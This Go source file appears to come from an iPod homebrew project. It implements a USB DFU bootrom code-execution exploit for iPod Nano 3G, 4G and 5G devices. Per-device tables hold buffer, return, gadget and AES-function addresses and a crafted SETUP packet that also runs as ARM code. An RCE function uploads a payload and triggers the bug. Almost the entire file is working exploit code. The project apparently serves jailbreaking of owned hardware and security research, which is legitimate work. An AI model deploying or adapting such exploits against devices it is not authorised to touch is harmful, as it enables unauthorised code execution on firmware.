package exploit

import (
	"bytes"
	"fmt"
	"time"

	"github.com/freemyipod/wInd3x/pkg/devices"
	"github.com/freemyipod/wInd3x/pkg/dfu"

	"github.com/google/gousb"
)

type Parameters struct {
	// Address of the DFU data buffer.
	DFUBufAddr uint32
	// Address at which payload begins execution, within the DFU data buffer,
	// as jumped into by the SetupPacket.
	ExecAddr uint32
	// Address of the USB DMA buffer, ie. the SETUP packet currently being
	// processed.
	USBBufAddr uint32
	// Address to return to from handler.
	ReturnAddr uint32
	// Address of trampoline in bootrom, jumped to by handler.
	TrampolineAddr uint16
	// Setup packet to be sent. This must also be valid ARM code, as it happens
	// to be executed.
	SetupPacket []byte
	// Address of 'mov r0, #1; bx lr' gadget.
	Ret1Addr uint32
	// Address of 'aes_hw_dec' function:
	// void aes_hw_dec(
	//      byte *dest, byte *src,
	//      size_t size,
	//      int key_type,
	//      byte *key, byte *iv)
	AESHWDec uint32
}

var ParametersForKind = map[devices.Kind]*Parameters{
	devices.Nano3: &Parameters{
		DFUBufAddr: 0x22028220,
		ExecAddr:   0x220282A8,
		USBBufAddr: 0x22028A20,
		// No fixup necessary (as we don't go through a `blx r0` trampoline),
		// but to make the exploit code generation simpler we provide the
		// return address anyway.
		ReturnAddr: 0x200048d4,
		// No trampoline necessary.
		TrampolineAddr: 0,
		// b 0x2202dc08
		SetupPacket: []byte{0x20, 0xfe, 0xff, 0xea, 0x06, 0x00, 0x00, 0x00},
		Ret1Addr:    0x20000d10,
		AESHWDec:    0x200020d4,
	},
	devices.Nano4: &Parameters{
		DFUBufAddr:     0x2202db00,
		ExecAddr:       0x2202dc08,
		USBBufAddr:     0x2202e300,
		ReturnAddr:     0x20004d64,
		TrampolineAddr: 0x3b0,
		// b 0x2202dc08
		SetupPacket: []byte{0x40, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},
		Ret1Addr:    0x20000d10,
		AESHWDec:    0x200020d4,
	},
	devices.Nano5: &Parameters{
		DFUBufAddr:     0x2202db00,
		ExecAddr:       0x2202dc08,
		USBBufAddr:     0x2202e300,
		ReturnAddr:     0x20004d70,
		TrampolineAddr: 0x37c,
		// b 0x2202dc08
		SetupPacket: []byte{0x40, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},
		Ret1Addr:    0x20000cbc,
		AESHWDec:    0x200020ec,
	},
}

func RCE(usb *gousb.Device, ep *Parameters, payload []byte, data []byte) error {
	usb.ControlTimeout = time.Millisecond * 50

	prefixLen := int(ep.ExecAddr - ep.DFUBufAddr)
	if len(data) > prefixLen {
		return fmt.Errorf("data too long")
	}
	pad := bytes.Repeat([]byte{'Z'}, prefixLen-len(data))
	data = append(data, pad...)
	payload = append(data, payload...)

	// Upload payload into DFU buffer, and reset status afterwards.
	if len(payload) > 0x400 {
		return fmt.Errorf("payload too large (%d > %d)", len(payload), 0x400)
	}
	if err := dfu.SendChunk(usb, payload, 0); err != nil {
		return fmt.Errorf("Upload: %w", err)
	}
	if err := dfu.Clean(usb); err != nil {
		return fmt.Errorf("clean: %w", err)
	}

	buf := make([]byte, 0x40)
	if _, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, buf); err != nil {
		return fmt.Errorf("first upload failed: %v", err)
	}

	if ep.TrampolineAddr != 0 {
		// Start a download of X+0x40 bytes, this will only send 0x40 bytes
		// (for some reason large control transfers don't work?), causing a state
		// structure field to be set to X.
		// X = TrampolineAddr, which is 0x3b0 for Nano 4G and 0x37c for Nano 5G
		l := ep.TrampolineAddr + 0x40
		buf = make([]byte, l)
		_, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, buf)
		if want, got := gousb.ErrorTimeout, err; want != got {
			return fmt.Errorf("upload trigger should have returned %v, got %v", want, got)
		}
	}

	// Trigger bug. This should get the payload executing.
	bmRequestType := ep.SetupPacket[0]
	bRequest := ep.SetupPacket[1]
	wValue := uint16(ep.SetupPacket[2]) | (uint16(ep.SetupPacket[3]) << 8)
	wIndex := uint16(ep.SetupPacket[4]) | (uint16(ep.SetupPacket[5]) << 8)
	_, err := usb.Control(bmRequestType, bRequest, wValue, wIndex, nil)
	if want, got := gousb.ErrorTimeout, err; want != got {
		return fmt.Errorf("bug trigger should have returned %v, got %v", want, got)
	}

	return nil

}
